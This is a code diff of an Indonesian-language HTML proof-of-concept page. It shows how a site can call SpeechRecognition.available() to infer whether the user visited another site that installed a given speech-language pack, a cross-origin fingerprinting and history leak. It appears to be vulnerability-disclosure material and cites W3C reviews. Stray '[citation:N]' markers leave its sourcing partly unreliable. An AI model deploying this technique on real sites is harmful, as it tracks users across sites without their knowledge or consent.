@@ -1,142 +1,77 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Cross-Origin History Spoofing POC</title>
-    <style>
-        body { font-family: Arial, sans-serif; max-width: 800px; margin: 20px auto; padding: 20px; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
-        #output { 
-            background: #f0f0f0; 
-            padding: 15px; 
-            border-radius: 5px; 
-            margin-top: 20px; 
-            white-space: pre-wrap;
-            font-family: monospace;
-        }
-        .warning { color: #c0392b; font-weight: bold; }
-    </style>
+    <title>Cross-Origin Install Fingerprinting POC</title>
 </head>
 <body>
-    <h1>🔬 Cross-Origin History Spoofing Test</h1>
-    <p>Demonstrasi bagaimana parameter <code>quality</code> dan bahasa dapat digunakan untuk 
-    <span class="warning">mengungkap riwayat penelusuran pengguna</span> tanpa izin.</p>
-    
-    <button onclick="runTest()">▶ Start Cross-Origin Test</button>
-    <div id="output">Klik tombol untuk memulai...</div>
+    <h3>Test: Cross-Origin Fingerprinting via install()</h3>
+    <button onclick="installAndCheck()">▶ Run Cross-Origin Test</button>
+    <pre id="output"></pre>
 
     <script>
-        // Simulasi: Situs A menginstall model bahasa tertentu
-        const INSTALLED_LANGUAGE = 'id-ID'; // Bahasa Indonesia
-        const INSTALLED_QUALITY = 'dictation';
-        
-        async function runTest() {
+        // Situs A: Menginstall bahasa target
+        const TARGET_LANG = 'id-ID';
+        const TARGET_QUALITY = 'dictation';
+
+        async function installAndCheck() {
             const output = document.getElementById('output');
-            output.textContent = '⏳ Mengumpulkan data fingerprint...\n';
-            
+            output.textContent = '⏳ Memulai pengujian...\n';
+
             try {
-                // Step 1: Dapatkan daftar suara yang tersedia (seperti yang dilakukan situs B)
-                const voices = await getVoices();
-                
-                // Step 2: Deteksi apakah kombinasi bahasa + quality terinstal
-                const languageInstalled = detectInstalledLanguage(voices);
-                const qualityAvailable = await detectQualityLevel();
-                
-                // Step 3: Inferensi riwayat pengguna
-                const historyInference = analyzeHistory(languageInstalled, qualityAvailable);
-                
-                // Step 4: Tampilkan hasil
+                // Step 1: Situs A menginstall paket bahasa (jika belum ada)
+                // const installed = await SpeechRecognition.install({
+                //     langs: [TARGET_LANG],
+                //     quality: TARGET_QUALITY
+                // });
+
+                // Step 2: Situs B memeriksa ketersediaan
+                const availability = await SpeechRecognition.available({
+                    langs: [TARGET_LANG],
+                    processLocally: true,
+                    quality: TARGET_QUALITY
+                });
+
+                // Step 3: Inferensi
+                let inference = '';
+                if (availability === 'available') {
+                    inference = '🔴 KOMBINASI TERDETEKSI: Pengguna pernah mengunjungi situs yang menginstal kombinasi ini.';
+                } else if (availability === 'downloadable') {
+                    inference = '🟡 Paket tersedia untuk diunduh, tetapi belum terinstal.';
+                } else {
+                    inference = '🟢 Paket tidak tersedia. Tidak ada indikasi kunjungan.';
+                }
+
                 output.textContent = `
-╔═══════════════════════════════════════════════════════════════════╗
-║          CROSS-ORIGIN HISTORY SPOOFING REPORT                    ║
-╠═══════════════════════════════════════════════════════════════════╣
-║                                                                  ║
-║ 📊 VOICE DATA:                                                   ║
-║   Total voices available: ${voices.length}                       ║
-║   Languages detected: ${[...new Set(voices.map(v => v.lang))].join(', ')}
-║                                                                  ║
-║ 🎯 TARGET COMBINATION:                                           ║
-║   Language: ${INSTALLED_LANGUAGE}                                ║
-║   Quality: ${INSTALLED_QUALITY}                                  ║
-║                                                                  ║
-║ ✅ DETECTION RESULT:                                             ║
-║   Language "${INSTALLED_LANGUAGE}" available: ${languageInstalled ? '✓ YES' : '✗ NO'}
-║   Quality "${INSTALLED_QUALITY}" available: ${qualityAvailable ? '✓ YES' : '✗ NO'}
-║                                                                  ║
-║ 🕵️ INFERENCE:                                                    ║
-║   ${historyInference}                                            ║
-║                                                                  ║
-║ ⚠️ RISK ASSESSMENT:                                              ║
-║   - Tidak ada interaksi pengguna                                 ║
-║   - Tidak ada izin yang diperlukan                               ║
-║   - Data dapat digunakan untuk pelacakan lintas-situs            ║
-║   - ID pengguna tetap persisten bahkan setelah clear cookie      ║
-║                                                                  ║
-╚═══════════════════════════════════════════════════════════════════╝
+╔═══════════════════════════════════════════════════════════════╗
+║        CROSS-ORIGIN INSTALL FINGERPRINTING REPORT            ║
+╠═══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║ 🎯 TARGET:                                                   ║
+║   Language: ${TARGET_LANG}                                   ║
+║   Quality: ${TARGET_QUALITY}                                 ║
+║                                                              ║
+║ 🔍 AVAILABILITY CHECK:                                       ║
+║   Result: ${availability}                                    ║
+║                                                              ║
+║ 🕵️ INFERENCE:                                                ║
+║   ${inference}                                               ║
+║                                                              ║
+║ ⚠️ RISK ASSESSMENT:                                          ║
+║   - Tidak memerlukan izin pengguna [citation:9]              ║
+║   - Cross-origin tracking tanpa notifikasi [citation:3]      ║
+║   - Data persisten bahkan setelah clear cookie               ║
+║   - Diakui oleh W3C sebagai risiko fingerprinting [citation:2]║
+║                                                              ║
+╚═══════════════════════════════════════════════════════════════╝
 
 📌 SUMBER:
-  - W3C TAG Design Review #1189
-  - W3C Design Review #1121
-  - Bugzilla Mozilla #2021222 (CVE-2026-8963)
-
-🔗 REFERENSI:
-  - https://github.com/w3ctag/design-reviews/issues/1189
-  - https://github.com/w3ctag/design-reviews/issues/1121
+  - W3C TAG Design Review #1189 [citation:2]
+  - MDN: SpeechRecognition.install() [citation:9]
+  - MDN: SpeechRecognition.available() [citation:4]
                 `.trim();
-                
+
             } catch (error) {
-                output.textContent = `❌ Error: ${error.message}\n\nPastikan browser Anda mendukung Web Speech API.`;
-            }
-        }
-
-        // Fungsi untuk mendapatkan daftar suara
-        function getVoices() {
-            return new Promise((resolve) => {
-                let voices = speechSynthesis.getVoices();
-                if (voices.length > 0) {
-                    resolve(voices);
-                } else {
-                    speechSynthesis.onvoiceschanged = () => {
-                        resolve(speechSynthesis.getVoices());
-                    };
-                }
-            });
-        }
-
-        // Deteksi apakah bahasa target terinstal
-        function detectInstalledLanguage(voices) {
-            return voices.some(v => v.lang === INSTALLED_LANGUAGE);
-        }
-
-        // Deteksi tingkat kualitas yang tersedia
-        async function detectQualityLevel() {
-            // Dalam implementasi nyata, ini akan menggunakan:
-            // await SpeechRecognition.available({ 
-            //     langs: [INSTALLED_LANGUAGE], 
-            //     processLocally: true, 
-            //     quality: INSTALLED_QUALITY 
-            // });
-            
-            // Simulasi: deteksi berdasarkan kemampuan perangkat
-            const hasGoodPerformance = navigator.hardwareConcurrency > 4;
-            if (INSTALLED_QUALITY === 'command') return true;
-            if (INSTALLED_QUALITY === 'dictation' && hasGoodPerformance) return true;
-            if (INSTALLED_QUALITY === 'conversation' && navigator.hardwareConcurrency > 8) return true;
-            
-            return false;
-        }
-
-        // Analisis inferensi riwayat
-        function analyzeHistory(langInstalled, qualityAvail) {
-            if (langInstalled && qualityAvail) {
-                return `🔴 Kemungkinan BESAR pengguna telah mengunjungi situs yang menginstal kombinasi ini.
-    Ini memungkinkan pelacakan lintas-situs tanpa izin.`;
-            } else if (langInstalled && !qualityAvail) {
-                return `🟡 Pengguna memiliki bahasa yang diinstal, tetapi kualitas tidak tersedia.
-    Ini mungkin menunjukkan kunjungan ke situs dengan konfigurasi berbeda.`;
-            } else {
-                return `🟢 Tidak ada indikasi kunjungan ke situs target.
-    Namun, deteksi ini tetap berjalan tanpa sepengetahuan pengguna.`;
+                output.textContent = `❌ Error: ${error.message}\n\nFitur ini mungkin belum didukung di browser Anda.`;
             }
         }
     </script>
